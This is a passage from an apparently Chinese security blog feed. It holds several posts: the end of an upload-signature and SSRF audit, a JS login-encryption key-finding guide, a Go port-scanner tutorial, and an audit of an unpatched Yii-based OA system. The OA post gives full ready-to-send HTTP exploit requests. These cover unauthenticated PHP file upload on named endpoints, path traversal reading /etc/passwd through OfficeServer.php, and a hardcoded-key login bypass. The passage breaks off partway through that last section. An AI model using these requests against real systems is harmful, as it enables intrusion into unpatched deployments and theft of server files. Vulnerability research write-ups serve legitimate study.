src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933889.png" alt="image">​</p><p>那么就可以直接生成<code>sign</code>​了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;md=upload&amp;uid=1asdasfasfasfasfasfa&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那么继续复现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /server/index.php/start?md=upload&amp;uid=1&amp;sign=e8766abd8742eb67a2c07b089ecf636a HTTP/1.1<br>Host: wp.com<br>Cache-Control: no-cache<br>Accept: */*<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: multipart/form-data; boundary=--------------------------570796120375390059114427<br>User-Agent: PostmanRuntime-ApipostRuntime/1.1.0<br>Content-Length: 389<br><br>----------------------------570796120375390059114427<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;1.php&quot;</span><br>Content-Type: application/x-httpd-php<br><br>&lt;?php phpinfo(); ?&gt;<br>----------------------------570796120375390059114427--<br></code></pre></td></tr></table></figure><p>上传后返回如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933013.png" alt="image">​</p><p>解码后为 同步错误</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933171.png" alt="image">​</p><p>‍</p><p>来看看源码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933287.png" alt="image">​</p><p>发现已经上传了，但是咱不知道上传路径啊。。。找一下本地可以发现在这里</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933438.png" alt="image">​</p><p>‍</p><p>但是如何找路径呢，可以关注到后续还有一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload_notify</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;notify&#x27;</span>],<span class="hljs-variable">$info</span>);<br></code></pre></td></tr></table></figure><p>我将<code>$info</code>​打印了下发现已经存入了上传的路径了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933559.png" alt="image">​</p><p>跟进下<code>upload_notify</code>​ 发现跟SSRF一样可以向外请求并且带上我们的<code>$info</code>​ ——–&gt; 这感觉写的就怕我找不到路径似的,这里的验签压根就不需要管他，因为文件都传上去了，无所谓了，只需要路径，而他也并没有判断验签对不对(如果校验了，就没办法上传了，因为<code>$info</code>​是未知的)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081930201.png" alt="image">​</p><p>于是带好参数写好验签即可成功触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;md=upload&amp;notify=http://127.0.0.1:8877/&amp;uid=1asdasfasfasfasfasfa&quot;</span>);<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401070009584.png" alt="image">​</p><p>‍</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /server/index.php/start?md=upload&amp;uid=1&amp;notify=http://127.0.0.1:8877/&amp;sign=88c03d47ed5a1df9ed7ed9e1c1ce8afd HTTP/1.1<br>Host: wp.com<br>Cache-Control: no-cache<br>Accept: */*<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: multipart/form-data; boundary=--------------------------570796120375390059114427<br>User-Agent: PostmanRuntime-ApipostRuntime/1.1.0<br>Content-Length: 389<br><br>----------------------------570796120375390059114427<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;<br>Content-Type: application/x-httpd-php<br><br><span class="hljs-meta">&lt;?php phpinfo(); ?&gt;</span><br>----------------------------570796120375390059114427--<br></code></pre></td></tr></table></figure><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>多扣代码多调试才行，一步一步来</li><li>有些时候框架忘记或者不熟悉还是要多仔细看看才行</li></ol><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透 - JS - 登录加密</title>
    <link href="/post/penetration-js-login-encryption-z1vcpbk.html"/>
    <url>/post/penetration-js-login-encryption-z1vcpbk.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="JS逆向"><a href="#JS逆向" class="headerlink" title="JS逆向"></a>JS逆向</h1><p>在一次登录中遇到了JS加密的情况，因为是比较入门级别的JS分析</p><p>想记录一下从入门到难得JS逆向</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051728499.png" alt="image">​​</p><p>肯定是前端进行了加密，于是在前端进行关键词的查询 个人比较喜欢查询加解密的关键词如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">ciph<br>key<br>crypto<br>secret<br>miyao<br>pass<br>AES<br>iv<br>pwd<br>password<br>CryptoJS<br>encrypt<br></code></pre></td></tr></table></figure><p>这里搜索<code>key</code>​特别多 于是搜索了下<code>crypto</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051728341.png" alt="image">​​</p><p>发现已经找到了<code>cryptoKey</code>​这个密钥，那么单纯一个密钥并且这个密钥看上去就很想AES所以通过AES去解密，(可能有小伙伴会问，那不应该也得去找找<code>iv</code>​吗)—&gt;</p><p>是的，按道理来说应该要去找的，但是如果是ECB模式的就不用找啦</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051728527.png" alt="image">​</p><p>当然还有另外一种方式拿到<code>key</code>​ 就是断点法，这也是在实战过程中用到最多的方式</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051728683.png" alt="image">​​</p><p>在运用到这个<code>key</code>​的地方打下断点，点击登录就可以看到密钥了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051728793.png" alt="image">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开发 - GoLang - 并发简单理解</title>
    <link href="/post/develop-golang-paimorizing-a-simple-understanding-1okfrd.html"/>
    <url>/post/develop-golang-paimorizing-a-simple-understanding-1okfrd.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emm这里会记录下我学<code>Go</code>​的一些小基础吧，毕竟之后肯定会接触<code>Go</code>​，用一些简单的例子来解释一些内容，这里大家可以尝试以写端口扫描工具来感受下并发</p><p>‍</p><p>‍</p><h1 id="并发机制"><a href="#并发机制" class="headerlink" title="并发机制"></a>并发机制</h1><p>‍</p><h2 id="不并发"><a href="#不并发" class="headerlink" title="不并发"></a>不并发</h2><p>‍</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">porter</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> port := <span class="hljs-number">0</span>; port &lt; <span class="hljs-number">65535</span>; port++ &#123;<br><br>address := fmt.Sprintf(<span class="hljs-string">&quot;192.168.0.128:%d&quot;</span>, port)<br>connect, connect_error := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, address) <br><span class="hljs-comment">//这行代码创建了一个TCP连接到指定的address。net.Dial函数尝试去连接一个网络端点，并返回一个Conn接口和一个error</span><br><span class="hljs-comment">//net.Dial是Go语言标准库net包中的一个函数，用于创建一个到指定网络和地址的连接。第一个参数是网络类型（如&quot;tcp&quot;、&quot;udp&quot;、&quot;ip&quot;等），第二个参数是地址（如&quot;localhost:8080&quot;）</span><br><span class="hljs-keyword">if</span> connect_error != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;[-] %d --&gt; close\n&quot;</span>, port)<br><span class="hljs-keyword">continue</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>connect.Close()<br>fmt.Printf(<span class="hljs-string">&quot;[+] %d --&gt;opening \n&quot;</span>, port)<br>&#125;<br>fmt.Println(address)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>porter()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051729422.png" alt="image">​</p><p>可以说是龟速</p><p>‍</p><h2 id="goroutine并发"><a href="#goroutine并发" class="headerlink" title="goroutine并发"></a>goroutine并发</h2><p>‍</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">porter</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> wait_group sync.WaitGroup <span class="hljs-comment">//声明一个类型为sync.WaitGroup的变量wait_group，用于等待所有的goroutine完成</span><br>time_start := time.Now()<br><span class="hljs-keyword">for</span> port := <span class="hljs-number">0</span>; port &lt; <span class="hljs-number">65535</span>; port++ &#123;<br>wait_group.Add(<span class="hljs-number">1</span>)<span class="hljs-comment">// 每次循环时，将等待组的计数器增加1</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(f_port <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wait_group.Done() <span class="hljs-comment">//当goroutine完成时，将等待组的计数器减1</span><br>address := fmt.Sprintf(<span class="hljs-string">&quot;192.168.0.128:%d&quot;</span>, f_port)<br>connect, connect_error := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, address)<br><span class="hljs-keyword">if</span> connect_error != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">//fmt.Printf(&quot;[-] %d --&gt; close\n&quot;, f_port)</span><br><span class="hljs-keyword">return</span><br>&#125;<br>connect.Close()<br>fmt.Printf(<span class="hljs-string">&quot;[+] %d --&gt;opening \n&quot;</span>, f_port)<br>&#125;(port) <span class="hljs-comment">// 结束goroutine函数，并传入当前的端口号</span><br>&#125;<br>wait_group.Wait() <span class="hljs-comment">//等待所有的goroutine完成 </span><br>time_stop := time.Now()<br>time_def := time_stop.Sub(time_start)<br>fmt.Printf(<span class="hljs-string">&quot;[*] 1-65535端口扫描完毕，共用时：%v。\n&quot;</span>, time_def)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>porter()<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051729851.png" alt="image">​</p><p>对上述代码进行理解，其实就是在循环当中每次循环计数器加一来起一个<code>Goroutines</code>​ 去执行我的匿名函数，相当于主线程在循环的当中多了很多独立的协程去跑我们函数体</p><p>如图 —&gt; 还能开无数个 然后每个协程的任务完成后就计数器减一，(因为循环肯定比扫描快，所以肯定是先计数器完才到函数执行完)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051729966.png" alt="image">​</p><p>‍</p><p>计数器的流程</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051729090.png" alt="image">​</p><p>‍</p><p>‍</p><h2 id="Goroutines是什么"><a href="#Goroutines是什么" class="headerlink" title="Goroutines是什么"></a>Goroutines是什么</h2><p>Goroutines 可以看作是轻量级线程。创建一个 goroutine 非常简单，只需要把 <code>go</code>​关键字放在函数调用语句前</p><p>‍</p><h2 id="channel是什么"><a href="#channel是什么" class="headerlink" title="channel是什么"></a>channel是什么</h2><p>他是一个用来实现多个goroutine之间数据共享的东西  比如goroutine1和goroutine2  这两个都是独立的 使用channel 通过管道连接在一起 达到数据共享，可以把goroutine1得到的内容给goroutine2</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051729216.png" alt="d6fda19df616c7410e709aa90a98fe5">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401051729956.png" alt="d0ece49809e6cb929e7e440ef869d42">​</p>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 - PHP - 某OA(Yii) - 0Day</title>
    <link href="/post/code-audit-php-some-oa-yii-0day-2poyy1.html"/>
    <url>/post/code-audit-php-some-oa-yii-0day-2poyy1.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a href="https://xz.aliyun.com/t/13888">https://xz.aliyun.com/t/13888</a></p><p>代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的是一套<code>Yii</code>​框架开发的OA系统，算是小0day吧，当然不是自己独自审计，感谢几个审计爹带我@up@冬夏 由于尚未公开，大部分都是厚码，凑合着康康</p><p>‍</p><h1 id="开发文档"><a href="#开发文档" class="headerlink" title="开发文档"></a>开发文档</h1><p>(有的时候一键搭建的时候是会存在一些开发文档的，这些入口文件，路由拼接 ， 都需要去查看这些开发文档)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130294.png" alt="image">​​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130677.png" alt="image">​​</p><p>可以发现他其实是以<code>system</code>​作为根目录来进行模块化管理，所以我们可以对照着开发文档以及登录的接口来对比看这个MVC框架是如何对应的,当然了，其实我们可以找到他的<code>Yii</code>​入口文件为<code>/web/index.php</code>​</p><p>这个<code>index.php</code>​做了几个定义，首先是设定了我们用户登录的地址为<code>/oa/main/login</code>​ 然后应用的入口为<code>oa</code>​ </p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130832.png" alt="image">​</p><p>抓到登录的接口</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130035.png" alt="image">​​</p><p>可以发现是<code>/oa/main/login</code>​这样的接口(由于他有csrf-token所以重放包会302)，所以直接看报错回显就行</p><p>那我们再来仔细看看<code>Yii</code>​的路由分析(具体详细的原理代码跟踪在参考链接中可参考)</p><p>其实框架的URI分析还是有点复杂的(<del>看个大概就行</del>)，这个时候我们来找找这个<code>/oa/main/login</code>​是怎么对应的</p><p>在<code>\system\modules\oa\controllers\MainController.php</code>​ 找到以下代码</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130161.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130273.png" alt="image">​</p><p>继续跟进<code>\system\modules\user\components\LoginAction::className()</code>​</p><p>搜索一下<code>账号不存在</code>​其实就可以找到确实是这么个对应法了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130459.png" alt="image">​</p><p>那么这个路由总结一下</p><p><code>/oa/main/login</code>​ -&gt; 模块名(models)&#x2F;控制器(controller)&#x2F;操作(action)</p><p>‍</p><p>当然了 ，在后续的审计过程中发现其实也给出了相对应的路由访问形式写在了代码中的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130583.png" alt="image">​</p><p>会在<code>$dependIgnoreValueList</code>​ 变量中将一些路由访问形式写出来(前提是这个<code>$layout</code>​是一个@开头的东东)</p><p>‍</p><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>‍</p><h2 id="上传1"><a href="#上传1" class="headerlink" title="上传1"></a>上传1</h2><p>‍</p><p>全局搜了下<code>move_uploaded_file</code>​ 然后找了两个在<code>modules</code>​下的文件进行审计</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130692.png" alt="image">​​</p><p>‍</p><p>当进去看上传逻辑的时候发现有一个很抽象的点，开发把扩展后缀的限制注释掉了，所以导致了后面写<code>$config</code>​的时候会没有效果</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130001.png" alt="image">​​</p><p>那么很有可能就会存在任意文件上传了，然后下面的操作就是跟进了下<code>saveAs</code>​方法发现也并没有什么过滤</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130193.png" alt="image">​</p><p>‍</p><p>那么接下来就是如何去找到一个控制器是调用了这个类的方法<code>\system\modules\main\extend\SaveUpload.php#saveFile</code>​的</p><p>emmm 全局搜索了下发现并没有(我裂开，可是明显确实是有问题的啊)于是我不死心就在此全局搜索了下<code>SaveUpload</code>​这个关键词</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130316.png" alt="image">​​</p><p>我突然看到一个点，他通过命名空间来进行调用方法的，所以说只要出现了<code>SaveUpload::saveFile(</code>​ (并且在modules下)就会存在任意文件上传了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130518.png" alt="image">​​</p><p>那么在上述已经讲述过了<code>Yii</code>​框架的路由分析，所以这个时候只要去找到谁去调用了这些路径的方法即可 ，比如全局搜索</p><ul><li><code>\system\modules\main\extend\Upload.php</code>​</li><li><code>\system\modules\party\extend\Upload.php</code>​</li></ul><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130662.png" alt="image">​​</p><p>但是上述两个最为简单的发现并没有成功(也不是权限问题感觉)</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031130816.png" alt="image">​​</p><p>这里属实太多任意文件上传了(MD要是CNVD估计能刷七八张了吧可惜bushi)</p><p>其实大部分都不能成功的(为啥？因为鉴权了，但是以下是存在未授权访问的)</p><ul><li><code>contacts/default/upload</code>​</li><li><code>salary/record/upload</code>​</li><li><code>knowledge/default/upload</code>​​​​​</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131002.png" alt="image">​​</p><p>而鉴权的代码是这样子的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131132.png" alt="image">​</p><p>最终报文</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /index.php/salary/record/upload HTTP/1.1<br>Host: xxx<br>Content-Length: 196<br>Cache-Control: max-age=0<br>sec-ch-ua: <br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: &quot;&quot;<br>Upgrade-Insecure-Requests: 1<br>Origin: http://127.0.0.1<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQayVsySyhSwgpmLk<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?1<br>Sec-Fetch-Dest: document<br>Referer: http://127.0.0.1/upload/upload.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br>------WebKitFormBoundaryQayVsySyhSwgpmLk<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;<br>Content-Type: image/png<br><br><span class="hljs-meta">&lt;?php phpinfo();?&gt;</span><br>------WebKitFormBoundaryQayVsySyhSwgpmLk--<br></code></pre></td></tr></table></figure><p>​​</p><h2 id="上传2-任意文件下载"><a href="#上传2-任意文件下载" class="headerlink" title="上传2 + 任意文件下载"></a>上传2 + 任意文件下载</h2><p>一样是全局搜索函数​<code>move_uploaded_file</code>​</p><p>找到<code>\web\static\lib\weboffice\js\OfficeServer.php</code>​这个文件(因为是在<code>static</code>​目录下于是就尝试访问下(因为很有可能是静态的资源可以直接访问))</p><p>所以我们直接访问下发现返回200证明文件存在</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131285.png" alt="image">​​</p><p>接着审计代码逻辑</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131397.png" alt="image">​</p><p>代码很短，可以很轻松读懂，获取一个json值，然后获取他的<code>OPTION</code>​值满足他的switch值就可以进入到上传的逻辑，可以进行文件下载，也可以进行上传</p><p>经过测试，可控</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131522.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131679.png" alt="image">​</p><p>接着就是构造下载包和上传包了</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131821.png" alt="image">​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET /static/lib/weboffice/js/OfficeServer.php?FormData=&#123;%22OPTION%22:%22LOADFILE%22,%22FILEPATH%22:%22/../../../../../../../../../../../etc/passwd%22&#125; HTTP/1.1<br>Host: xxxx<br>Accept: application/json, text/javascript, */*; q=0.01<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br>Referer: http://oa1.shuidinet.com/index.php/oa/main/login<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131148.png" alt="image">​​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /static/lib/weboffice/js/OfficeServer.php?FormData=&#123;%22OPTION%22:%22SAVEFILE%22,&quot;FILEPATH&quot;:&quot;/222.php&quot;&#125; HTTP/1.1<br>Host: xxxx<br>Content-Length: 202<br>Cache-Control: max-age=0<br>sec-ch-ua: <br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: &quot;&quot;<br>Upgrade-Insecure-Requests: 1<br>Origin: http://127.0.0.1<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQayVsySyhSwgpmLk<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?1<br>Sec-Fetch-Dest: document<br>Referer: http://127.0.0.1/upload/upload.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br>------WebKitFormBoundaryQayVsySyhSwgpmLk<br>Content-Disposition: form-data; name=&quot;FileData&quot;; filename=&quot;222.php&quot;<br>Content-Type: image/png<br><br><span class="hljs-meta">&lt;?php phpinfo();?&gt;</span><br>------WebKitFormBoundaryQayVsySyhSwgpmLk--<br><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h2><p>在上传的篇章中其实是可以知道架构的，所以看了下<code>oa</code>​下的文件，发现<code>Auth</code>​的鉴权控制器查看后发现存在硬编码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131335.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131445.png" alt="image">​​</p><p>当然也给了注释</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131754.png" alt="image">​​</p><p>那么构造逻辑即可成功登录，传入<code>user</code>​ base64加密的内容并且跟key进行拼接后再md5加密传为<code>token</code>​， 两者相等即可登录</p><p>前提是user是存在的(跑一下就知道是zhangsan存在)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 